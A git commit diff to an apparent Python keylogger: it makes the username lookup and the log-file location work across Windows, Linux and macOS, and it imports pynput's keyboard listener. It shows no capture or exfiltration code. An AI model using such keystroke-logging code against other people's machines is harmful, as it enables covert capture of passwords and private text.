3618aa308c233c6dfcdd06f1cc9659cf90b56e36
Divakar Rajesh <sdivakarrajesh@gmail.com>
2020-12-25 14:03:30 +0530

    made username getting os agnostic

--- main.py
+++ main.py
@@ -1,14 +1,22 @@
-import os
+import getpass
 import shutil
 import logging
 from pynput.keyboard import Listener as KeyListener
 from datetime import datetime
+from sys import platform
 
-username = os.getlogin()
-today = datetime.today().strftime('%Y-%m-%d')
-print(username)
-logs_dir = f"C:/Users/{username}/Desktop"
-logging.basicConfig(filename=f"{logs_dir}/{today}.log", level=logging.DEBUG, format="%(asctime)s: %(message)s")
+username = getpass.getuser()
+
+logs_dir = ""
+if platform == "linux" or platform == "linux2" or platform == "darwin": # linux or OS X
+    logs_dir = f"/home/{username}"
+elif platform == "win32": # Windows
+    logs_dir = f"C:/Users/{username}/Desktop"
+else: 
+    raise ValueError("Unknown OS - cannot determine where to store the log!")
+
+log_file = datetime.today().strftime('%Y-%m-%d')
+logging.basicConfig(filename=f"{logs_dir}/{log_file}.log", level=logging.DEBUG, format="%(asctime)s: %(message)s")
 
 
 def key_handler(key):
